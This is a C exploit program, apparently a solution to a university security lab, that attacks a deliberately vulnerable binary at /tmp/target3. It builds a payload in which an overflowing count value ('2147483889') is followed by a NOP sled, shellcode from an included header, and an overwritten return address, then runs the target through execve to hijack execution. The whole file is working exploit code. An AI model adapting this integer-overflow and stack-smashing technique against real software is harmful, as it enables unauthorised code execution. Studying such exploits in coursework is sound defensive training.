#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char *count; 

  int addr = 0xbfffd8c8  ;
  int i;
  count = "2147483889";
  char buf[4820];

  for(i = 0; i < 4820; i++) {
  if(i < strlen(count)) {
    *(buf + i) = count[i]; // <count>
  } else if(i < (strlen(count) + 1)) {
    *(buf + i) = ','; // <comma>
  } else if(i < (4800 + strlen(count) + 1 - strlen(shellcode))) {
    *(buf + i) = '\x90'; // <nop>
  } else if(i < (4800 + strlen(count) + 1)) {
    *(buf + i) = shellcode[i - 4800 - strlen(count) - 1 + strlen(shellcode)]; // <shellcode>
  } else if(i < (4804 + strlen(count) + 1)) {
    *(buf + i) = '\x90'; // <filler>
  } else if(i < (4808 + strlen(count) + 1)) {
     *(buf + i) = addr >> ((i - 4800 - strlen(count) - 1) * 8); // <eip>
  } else {
    *(buf + i) = '\x00'; // terminate with null
  }
} 
 
 
  args[0] = TARGET;       args[1]=buf   ; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
